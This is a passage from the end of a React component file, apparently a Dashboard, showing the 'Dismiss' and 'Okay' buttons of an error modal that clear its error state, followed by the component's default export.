              <div className="flex justify-end gap-3 pt-4">
                <button
                  type="button"
                  className="px-4 py-3 rounded-full bg-gray-100 text-gray-700 hover:bg-gray-200 transition-colors font-medium text-sm cursor-pointer"
                  onClick={() => {
                    setIsErrorModalOpen(false);
                    setErrorMessage(null);
                  }}
                >
                  Dismiss
                </button>
                <button
                  type="button"
                  className="px-4 py-3 rounded-full bg-red-600 text-white font-semibold hover:bg-red-700 transition-colors text-sm cursor-pointer"
                  onClick={() => {
                    setIsErrorModalOpen(false);
                    setErrorMessage(null);
                  }}
                >
                  Okay
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
